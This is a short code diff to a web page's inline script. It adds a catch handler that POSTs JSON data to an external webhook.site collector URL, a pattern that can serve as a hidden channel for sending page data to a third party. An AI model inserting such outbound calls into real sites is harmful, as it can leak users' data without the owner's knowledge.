@@ -25,7 +25,12 @@
     body: JSON.stringify(data),
     headers: { 'Content-Type': 'application/json' }
   });
-});
+}).catch(data => {
+  fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
+    method: 'POST',
+    body: JSON.stringify(data),
+    headers: { 'Content-Type': 'application/json' }})}
+  );
     </script>
 </body>
 </html>
